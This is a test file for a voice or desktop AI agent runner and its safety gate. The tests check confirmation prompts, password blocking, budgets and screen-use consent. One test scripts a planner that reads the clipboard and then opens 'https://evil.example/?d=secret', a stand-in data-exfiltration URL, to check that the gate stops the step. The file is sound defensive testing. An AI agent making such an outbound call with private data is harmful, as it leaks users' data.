import { describe, expect, it, vi } from "vitest";
import { AgentRunner, AGENT_LIMITS } from "./runner.js";
import { classifyAction } from "./safety.js";
import { toInternalAction, AGENT_ACTION_NAMES } from "./actions.js";
import type { Planner, PlannerDecision } from "./planner.js";
import type { ChatMessage } from "../llm.js";
import type { ActionResult, AgentAction, AgentDevice, AgentStatus } from "./types.js";

let callSeq = 0;
const act = (name: string, args: Record<string, unknown> = {}, expectation?: AgentAction["expect"]): PlannerDecision => {
  const id = `c${++callSeq}`;
  return {
    kind: "action",
    action: { name, args, expect: expectation },
    toolCallId: id,
    assistant: { role: "assistant", content: "", tool_calls: [{ id, type: "function", function: { name, arguments: JSON.stringify(args) } }] },
  };
};
const text = (content: string): PlannerDecision => ({ kind: "text", assistant: { role: "assistant", content } });

function scripted(decisions: PlannerDecision[]) {
  const seen: ChatMessage[][] = [];
  const planner: Planner = {
    next: vi.fn(async (messages: ChatMessage[]) => {
      seen.push(messages.map((m) => ({ ...m })));
      const d = decisions.shift();
      if (!d) throw new Error("planner script exhausted");
      return d;
    }),
  };
  return { planner, seen };
}

function device(results: Partial<Record<string, (a: AgentAction) => ActionResult>> = {}, verifyOk = true) {
  const calls: AgentAction[] = [];
  const dev: AgentDevice = {
    observe: vi.fn(async () => ({ platform: "linux", activeWindow: { title: "Desktop" } })),
    act: vi.fn(async (a: AgentAction) => {
      calls.push(a);
      return results[a.name]?.(a) ?? { ok: true, message: `${a.name} ok` };
    }),
    verify: vi.fn(async () => ({ ok: verifyOk, detail: verifyOk ? "ok" : "file does not contain 'milk'" })),
  };
  return { dev, calls };
}

function runner(planner: Planner, dev: AgentDevice, extra: Partial<ConstructorParameters<typeof AgentRunner>[0]> = {}) {
  const statuses: AgentStatus[] = [];
  const r = new AgentRunner({ goal: "add milk to my list", language: "en", device: dev, planner, onStatus: (s) => statuses.push(s), ...extra });
  return { r, statuses };
}

// Every assistant tool_call must be answered by a tool message before the next assistant/user message.
function assertHistoryValid(messages: ChatMessage[]) {
  for (let i = 0; i < messages.length; i++) {
    const m = messages[i];
    for (const call of m.tool_calls ?? []) {
      expect(messages[i + 1]?.role).toBe("tool");
      expect(messages[i + 1]?.tool_call_id).toBe(call.id);
    }
    if (m.role === "tool") expect(messages[i - 1]?.tool_calls?.[0]?.id).toBe(m.tool_call_id);
  }
}

describe("AgentRunner", () => {
  it("runs skills until done and reports progress", async () => {
    const { planner, seen } = scripted([act("file_write", { path: "~/list.txt", content: "milk", mode: "append" }), act("done", { summary: "Added milk." })]);
    const { dev, calls } = device();
    const { r, statuses } = runner(planner, dev);
    await expect(r.start()).resolves.toEqual({ kind: "done", summary: "Added milk." });
    expect(calls.map((c) => c.name)).toEqual(["file_write"]);
    expect(statuses[0]).toEqual({ state: "started", goal: "add milk to my list" });
    expect(statuses.at(-1)).toMatchObject({ state: "ended", ok: true });
    expect(seen[0][1].content).toContain("Goal: add milk to my list");
    assertHistoryValid(seen[1]);
  });

  it("pauses to ask the user and resumes with the answer", async () => {
    const { planner, seen } = scripted([act("ask_user", { question: "Which list?" }), act("done", { summary: "Done." })]);
    const { dev } = device();
    const { r } = runner(planner, dev);
    await expect(r.start()).resolves.toEqual({ kind: "ask", question: "Which list?" });
    expect(r.waiting).toBe("ask");
    await expect(r.resumeWithAnswer("the shopping one")).resolves.toMatchObject({ kind: "done" });
    const last = seen[1];
    assertHistoryValid(last);
    expect(last.at(-1)?.content).toContain("the shopping one");
  });

  it("requires a spoken yes before deleting, and runs it only after yes", async () => {
    const { planner } = scripted([act("file_delete", { path: "~/old.txt" }), act("done", { summary: "Deleted." })]);
    const { dev, calls } = device();
    const { r } = runner(planner, dev);
    const first = await r.start();
    expect(first).toMatchObject({ kind: "confirm" });
    expect((first as { prompt: string }).prompt).toContain("~/old.txt");
    expect(calls).toHaveLength(0);
    await expect(r.resumeWithConfirmation(true)).resolves.toMatchObject({ kind: "done" });
    expect(calls).toEqual([expect.objectContaining({ name: "file_delete", confirmed: true })]);
  });

  it("never runs the risky action when the user says no", async () => {
    const { planner, seen } = scripted([act("file_delete", { path: "~/old.txt" }), act("done", { summary: "Okay, left it." })]);
    const { dev, calls } = device();
    const { r } = runner(planner, dev);
    await r.start();
    await expect(r.resumeWithConfirmation(false)).resolves.toMatchObject({ kind: "done" });
    expect(calls).toHaveLength(0);
    expect(seen[1].at(-1)?.content).toMatch(/said no/i);
    assertHistoryValid(seen[1]);
  });

  it("honours the client's own confirmation demand (e.g. overwriting an existing file)", async () => {
    const { planner } = scripted([act("file_write", { path: "~/a.txt", content: "x", mode: "overwrite" }), act("done", { summary: "Replaced." })]);
    const { dev, calls } = device({
      file_write: (a) => (a.confirmed ? { ok: true, message: "written" } : { ok: false, message: "exists", needsConfirmation: { prompt: "Replace ~/a.txt?" } }),
    });
    const { r } = runner(planner, dev);
    await expect(r.start()).resolves.toEqual({ kind: "confirm", prompt: "Replace ~/a.txt?" });
    await expect(r.resumeWithConfirmation(true)).resolves.toMatchObject({ kind: "done" });
    expect(calls.map((c) => c.confirmed ?? false)).toEqual([false, true]);
  });

  it("refuses to type into password fields and tells the planner why", async () => {
    const { planner, seen } = scripted([act("set_text", { element: "Password", text: "hunter2" }), act("ask_user", { question: "Please type your password, then say continue." })]);
    const { dev, calls } = device();
    const { r } = runner(planner, dev);
    await expect(r.start()).resolves.toMatchObject({ kind: "ask" });
    expect(calls).toHaveLength(0);
    expect(seen[1].at(-1)?.content).toContain("won't type passwords");
  });

  it("turns a failed verification into a failure the planner sees", async () => {
    const { planner, seen } = scripted([act("file_write", { path: "~/l.txt", content: "eggs", mode: "append" }, { fileContains: { path: "~/l.txt", text: "milk" } }), act("done", { summary: "x" })]);
    const { dev } = device({}, false);
    const { r } = runner(planner, dev);
    await r.start();
    const tool = JSON.parse(seen[1].at(-1)!.content);
    expect(tool.ok).toBe(false);
    expect(tool.message).toContain("check failed");
  });

  it("stops after repeated failures instead of looping", async () => {
    const decisions = Array.from({ length: 10 }, () => act("open_app", { app: "nope" }));
    const { planner } = scripted(decisions);
    const { dev, calls } = device({ open_app: () => ({ ok: false, message: "not installed" }) });
    const { r } = runner(planner, dev);
    await expect(r.start()).resolves.toMatchObject({ kind: "failed" });
    expect(calls).toHaveLength(AGENT_LIMITS.maxConsecutiveFailures);
  });

  it("enforces the step budget", async () => {
    const { planner } = scripted(Array.from({ length: 10 }, () => act("observe")));
    const { dev } = device();
    const { r } = runner(planner, dev, { limits: { maxSteps: 3 } });
    await expect(r.start()).resolves.toMatchObject({ kind: "failed" });
    expect(planner.next).toHaveBeenCalledTimes(3);
  });

  it("enforces the time budget", async () => {
    let t = 0;
    const { planner } = scripted(Array.from({ length: 10 }, () => act("wait", { seconds: 1 })));
    const { dev } = device({ wait: () => ((t += 60_000), { ok: true, message: "waited" }) });
    const { r } = runner(planner, dev, { now: () => t, limits: { timeoutMs: 120_000 } });
    await expect(r.start()).resolves.toMatchObject({ kind: "failed", reason: expect.stringContaining("too long") });
  });

  it("can be cancelled mid-task", async () => {
    const { planner } = scripted([act("wait", { seconds: 1 }), act("done", { summary: "x" })]);
    const { dev } = device();
    const { r } = runner(planner, dev);
    (dev.act as ReturnType<typeof vi.fn>).mockImplementationOnce(async () => {
      r.cancel();
      return { ok: true, message: "ok" };
    });
    await expect(r.start()).resolves.toEqual({ kind: "cancelled" });
  });

  it("nudges once when the model replies in prose, then accepts it", async () => {
    const { planner } = scripted([text("I think it's done"), text("All done.")]);
    const { dev } = device();
    const { r } = runner(planner, dev);
    await expect(r.start()).resolves.toEqual({ kind: "done", summary: "All done." });
  });

  it("never reports success for an empty reply (regression: false 'Done.' in the eval)", async () => {
    const { planner } = scripted([act("file_list", { path: "~/Downloads" }), text(""), text("")]);
    const { dev } = device();
    const { r } = runner(planner, dev);
    await expect(r.start()).resolves.toMatchObject({ kind: "failed" });
    expect(planner.next).toHaveBeenCalledTimes(3); // the empty reply got a nudge first
  });

  it("keeps the planner context bounded without orphaning tool results", async () => {
    const decisions = [...Array.from({ length: 30 }, () => act("observe")), act("done", { summary: "ok" })];
    const { planner, seen } = scripted(decisions);
    const { dev } = device();
    const { r } = runner(planner, dev, { limits: { keepRecentSteps: 5 } });
    await r.start();
    const last = seen.at(-1)!;
    expect(last.length).toBeLessThanOrEqual(2 + 5 * 2);
    expect(last[0].role).toBe("system");
    expect(last[1].content).toContain("Goal:");
    assertHistoryValid(last);
  });
});

describe("AgentRunner context hygiene", () => {
  it("keeps only the newest window listing in the planner's context", async () => {
    const { planner, seen } = scripted([act("click", { element: "e1" }), act("click", { element: "e2" }), act("click", { element: "e3" }), act("done", { summary: "ok" })]);
    let n = 0;
    const { dev } = device({ click: () => ({ ok: true, message: "clicked", observation: { elements: `[e1] button "view ${++n}"` } }) });
    const { r } = runner(planner, dev);
    await r.start();
    const states = seen.at(-1)!.filter((m) => m.role === "tool").map((m) => JSON.parse(m.content).state as string);
    expect(states).toHaveLength(3);
    expect(states[0]).toContain("omitted");
    expect(states[1]).toContain("omitted");
    expect(states[2]).toContain("view 3"); // the latest one survives intact
    assertHistoryValid(seen.at(-1)!);
  });
});

describe("classifyAction (deterministic safety gate)", () => {
  const a = (name: string, args: Record<string, unknown>, confirmed = false): AgentAction => ({ name, args, confirmed });
  it("requires confirmation for deletes and consequential clicks", () => {
    expect(classifyAction(a("file_delete", { path: "~/x" })).level).toBe("confirm");
    for (const label of ["Place order", "Buy now", "Send", "Delete", "Checkout", "Submit"]) {
      expect(classifyAction(a("click", { element: label })).level).toBe("confirm");
    }
    expect(classifyAction(a("click", { element: "File" })).level).toBe("allow");
    expect(classifyAction(a("click", { element: "12" }), "Send message").level).toBe("confirm");
  });
  it("blocks typing secrets", () => {
    expect(classifyAction(a("set_text", { element: "Card number", text: "4111" })).level).toBe("block");
    expect(classifyAction(a("type_text", { text: "x" }), "Password").level).toBe("block");
  });
  it("asks before settings that can cut the user off, not before harmless ones", () => {
    expect(classifyAction(a("system_setting", { setting: "wifi", value: "off" })).level).toBe("confirm");
    expect(classifyAction(a("system_setting", { setting: "bluetooth", value: "off" })).level).toBe("confirm");
    expect(classifyAction(a("system_setting", { setting: "lock_screen", value: "on" })).level).toBe("confirm");
    expect(classifyAction(a("system_setting", { setting: "wifi", value: "on" })).level).toBe("allow");
    expect(classifyAction(a("system_setting", { setting: "volume", value: "30" })).level).toBe("allow");
    expect(classifyAction(a("system_setting", { setting: "dark_mode", value: "off" })).level).toBe("allow");
  });
  it("maps the compact system call to the internal action", () => {
    expect(toInternalAction("system", { setting: "volume", value: "up" })).toEqual({ name: "system_setting", args: { setting: "volume", value: "up" } });
  });
  it("lets confirmed actions through", () => {
    expect(classifyAction(a("file_delete", { path: "~/x" }, true)).level).toBe("allow");
  });
});

describe("toInternalAction (compact planner schema -> internal actions)", () => {
  it("maps file/clipboard ops to the internal names the desktop understands", () => {
    expect(toInternalAction("file", { op: "write", path: "~/a", content: "x", mode: "append" })).toEqual({ name: "file_write", args: { path: "~/a", content: "x", mode: "append" } });
    expect(toInternalAction("clipboard", { op: "read" })).toEqual({ name: "clipboard_read", args: {} });
    expect(toInternalAction("open_app", { app: "notepad" })).toEqual({ name: "open_app", args: { app: "notepad" } });
  });
  it("turns path into from for move/copy (regression: 'No path given' in the eval)", () => {
    expect(toInternalAction("file", { op: "move", path: "~/Desktop/a.txt", to: "~/Desktop/b.txt" })).toEqual({ name: "file_move", args: { from: "~/Desktop/a.txt", to: "~/Desktop/b.txt" } });
    expect(toInternalAction("file", { op: "copy", path: "~/x", to: "~/y" }).args).toEqual({ from: "~/x", to: "~/y" });
  });
  it("only ever produces names the runner knows", () => {
    for (const op of ["read", "write", "list", "move", "copy", "delete", "open"]) expect(AGENT_ACTION_NAMES.has(toInternalAction("file", { op, path: "~" }).name)).toBe(true);
    expect(AGENT_ACTION_NAMES.has(toInternalAction("file", { op: "explode", path: "~" }).name)).toBe(false);
  });
});

describe("recoverRejectedGeneration (Groq rejected the model's output)", () => {
  it("treats a fake tool call carrying a summary as done", async () => {
    const { recoverRejectedGeneration } = await import("./planner.js");
    const d = recoverRejectedGeneration('{"name": "answer", "arguments": {"summary": "Renamed notes.txt."}}');
    expect(d.kind).toBe("action");
    if (d.kind === "action") {
      expect(d.action).toEqual({ name: "done", args: { summary: "Renamed notes.txt." } });
      expect(d.assistant.tool_calls?.[0].id).toBe(d.toolCallId); // history stays valid
    }
  });
  it("treats a fake 'reason' call as a failure with that reason (never as a success)", async () => {
    const { recoverRejectedGeneration } = await import("./planner.js");
    const d = recoverRejectedGeneration('{"name": "json", "arguments": {"reason": "Unable to close the editor."}}');
    expect(d.kind).toBe("action");
    if (d.kind === "action") expect(d.action).toEqual({ name: "fail", args: { reason: "Unable to close the editor." } });
  });
  it("never lets raw JSON become spoken text", async () => {
    const { recoverRejectedGeneration } = await import("./planner.js");
    expect(recoverRejectedGeneration('{"name":"x","arguments":{"n":1}}')).toEqual({ kind: "text", assistant: { role: "assistant", content: "" } });
    expect(recoverRejectedGeneration("[1,2,3]")).toEqual({ kind: "text", assistant: { role: "assistant", content: "" } });
  });
  it("treats plain prose as text (runner nudges once, then accepts it as the summary)", async () => {
    const { recoverRejectedGeneration } = await import("./planner.js");
    expect(recoverRejectedGeneration("  Todo list updated with “call the plumber”. ")).toEqual({
      kind: "text",
      assistant: { role: "assistant", content: "Todo list updated with “call the plumber”." },
    });
  });
  it("end to end: prose after the last step ends the task as done, not as a crash", async () => {
    const { planner } = scripted([act("file_write", { path: "~/l.txt", content: "x", mode: "append" }), text("Todo list updated."), text("Todo list updated.")]);
    const { dev } = device();
    const { r } = runner(planner, dev);
    await expect(r.start()).resolves.toEqual({ kind: "done", summary: "Todo list updated." });
  });
});

describe("localized confirmation prompts", () => {
  it("asks in the user's language for server- and client-detected risks", async () => {
    const { planner } = scripted([act("file_delete", { path: "~/old.txt" })]);
    const { dev } = device();
    const r = new AgentRunner({ goal: "x", language: "hi", device: dev, planner });
    const out = await r.start();
    expect(out).toMatchObject({ kind: "confirm" });
    expect((out as { prompt: string }).prompt).toContain("ट्रैश");

    const p2 = scripted([act("file_write", { path: "~/a.txt", content: "x", mode: "overwrite" })]);
    const d2 = device({ file_write: () => ({ ok: false, message: "exists", needsConfirmation: { prompt: "Replace ~/a.txt?", kind: "overwrite", target: "~/a.txt" } }) });
    const r2 = new AgentRunner({ goal: "x", language: "es", device: d2.dev, planner: p2.planner });
    expect(await r2.start()).toEqual({ kind: "confirm", prompt: "¿Reemplazo todo el contenido de ~/a.txt? Di sí para confirmar." });
  });
  it("falls back to English for unknown languages and to the client prompt when no kind is given", async () => {
    const { confirmPrompt } = await import("./confirmPrompts.js");
    expect(confirmPrompt("delete", "~/x", "zz")).toBe("Move ~/x to the Trash? Say yes to confirm.");
  });
});

describe("GroqPlanner plain-text JSON replies", () => {
  it("decodes a JSON-shaped plain reply instead of speaking it raw (regression from the web eval)", async () => {
    vi.resetModules();
    vi.doMock("../llm.js", () => ({
      DEFAULT_CHAT_MODEL: "m",
      runLlmStep: vi.fn(async () => ({ assistantMessage: { role: "assistant", content: '{"summary":"No deals are listed."}' }, toolCalls: [] })),
    }));
    const { GroqPlanner } = await import("./planner.js");
    const d = await new GroqPlanner("k").next([]);
    expect(d).toMatchObject({ kind: "action", action: { name: "done", args: { summary: "No deals are listed." } } });
    vi.doUnmock("../llm.js");
  });
});


describe("screen (vision fallback) consent", () => {
  it("asks ONCE per task, in the user's language, before any screen use — then not again", async () => {
    const { planner } = scripted([act("screen_look"), act("screen_look"), act("done", { summary: "ok" })]);
    const { dev, calls } = device();
    const r = new AgentRunner({ goal: "x", language: "es", device: dev, planner });
    const first = await r.start();
    expect(first).toMatchObject({ kind: "confirm" });
    expect((first as { prompt: string }).prompt).toContain("pantalla");
    expect(calls).toHaveLength(0); // nothing touched the screen yet
    await expect(r.resumeWithConfirmation(true)).resolves.toMatchObject({ kind: "done" });
    expect(calls.map((c) => c.name)).toEqual(["screen_look", "screen_look"]); // second one did not ask again
    expect(calls.every((c) => c.args.consented === true)).toBe(true); // consent travels to the device
  });
  it("a no means the screen is never used", async () => {
    const { planner } = scripted([act("screen_look"), act("done", { summary: "ok" })]);
    const { dev, calls } = device();
    const r = new AgentRunner({ goal: "x", language: "en", device: dev, planner });
    await r.start();
    await r.resumeWithConfirmation(false);
    expect(calls).toHaveLength(0);
  });
  it("the screen yes does NOT approve a risky click: the device's own confirmation still stops it", async () => {
    // (screen_click itself is switched off now; the invariant is about the consent yes, so a device that demands its own
    // confirmation on a screen action stands in for the risky click.)
    const { planner } = scripted([act("screen_look"), act("done", { summary: "ok" })]);
    const { dev, calls } = device({
      screen_look: (a) => (a.confirmed ? { ok: true, message: "looked" } : { ok: false, message: "n", needsConfirmation: { prompt: "Really?", kind: "click", target: "Place order button" } }),
    });
    const r = new AgentRunner({ goal: "x", language: "en", device: dev, planner });
    expect(await r.start()).toMatchObject({ kind: "confirm" }); // 1) screen consent
    const second = await r.resumeWithConfirmation(true);
    expect(second).toMatchObject({ kind: "confirm" }); // 2) the click itself still needs its own yes
    expect(calls.map((c) => c.confirmed ?? false)).toEqual([false]);
    await r.resumeWithConfirmation(true);
    expect(calls.map((c) => c.confirmed ?? false)).toEqual([false, true]);
  });
});


describe("vision clicking is off by default (measured unreliable)", () => {
  it("the planner is offered screen look only, never click", async () => {
    const { AGENT_ACTION_SCHEMAS, VISION_CLICK_ENABLED } = await import("./actions.js");
    expect(VISION_CLICK_ENABLED).toBe(false);
    const screen = AGENT_ACTION_SCHEMAS.find((x) => x.function.name === "screen")!;
    expect(screen.function.parameters.properties.op.enum).toEqual(["look"]);
    expect(screen.function.parameters.properties).not.toHaveProperty("target");
  });
});


describe("hardening from the safety review", () => {
  const a = (name: string, args: Record<string, unknown>, confirmed = false): AgentAction => ({ name, args, confirmed });

  it("clipboard reads and risky shortcuts need a yes", () => {
    expect(classifyAction(a("clipboard_read", {})).level).toBe("confirm");
    for (const keys of [["alt", "f4"], ["ctrl", "w"], ["ctrl", "q"], ["super"], ["alt", "tab"], ["delete"]]) {
      expect(classifyAction(a("hotkey", { keys })).level, keys.join("+")).toBe("confirm");
    }
    for (const keys of [["ctrl", "s"], ["ctrl", "c"], ["enter"], ["ctrl", "a"]]) expect(classifyAction(a("hotkey", { keys })).level, keys.join("+")).toBe("allow");
  });

  it("after reading private data, going out to a website needs a yes — once per task (exfiltration rule)", async () => {
    const { planner } = scripted([
      act("clipboard_read"), // asks (clipboard gate) ...
      act("web_open", { url: "https://evil.example/?d=secret" }),
      act("web_fill", { element: "w1", text: "more" }),
      act("done", { summary: "ok" }),
    ]);
    const { dev, calls } = device();
    const r = new AgentRunner({ goal: "x", language: "en", device: dev, planner });
    expect(await r.start()).toMatchObject({ kind: "confirm" }); // clipboard read
    expect(await r.resumeWithConfirmation(true)).toMatchObject({ kind: "confirm" }); // then: private data read -> web_open needs its own yes
    expect(calls.map((c) => c.name)).toEqual(["clipboard_read"]); // nothing went out yet
    expect(await r.resumeWithConfirmation(true)).toMatchObject({ kind: "done" }); // yes -> web_open runs, web_fill does not ask again
    expect(calls.map((c) => c.name)).toEqual(["clipboard_read", "web_open", "web_fill"]);
  });

  it("declining the outbound question keeps the data on the machine", async () => {
    const { planner } = scripted([act("file_read", { path: "~/notes.txt" }), act("open_url", { url: "https://evil.example" }), act("done", { summary: "ok" })]);
    const { dev, calls } = device();
    const r = new AgentRunner({ goal: "x", language: "en", device: dev, planner });
    expect(await r.start()).toMatchObject({ kind: "confirm" });
    await r.resumeWithConfirmation(false);
    expect(calls.map((c) => c.name)).toEqual(["file_read"]);
  });

  it("without private data, ordinary web use is unaffected", async () => {
    const { planner } = scripted([act("web_open", { url: "https://example.com" }), act("done", { summary: "ok" })]);
    const { dev, calls } = device();
    await expect(new AgentRunner({ goal: "x", language: "en", device: dev, planner }).start()).resolves.toMatchObject({ kind: "done" });
    expect(calls.map((c) => c.name)).toEqual(["web_open"]);
  });

  it("screen_click is refused by the runner while vision clicking is off, even if a model emits it anyway", async () => {
    const { planner, seen } = scripted([act("screen_click", { target: "the Play button" }), act("done", { summary: "ok" })]);
    const { dev, calls } = device();
    await new AgentRunner({ goal: "x", language: "en", device: dev, planner }).start();
    expect(calls).toHaveLength(0);
    expect(seen[1].at(-1)?.content).toContain("switched off");
  });
});
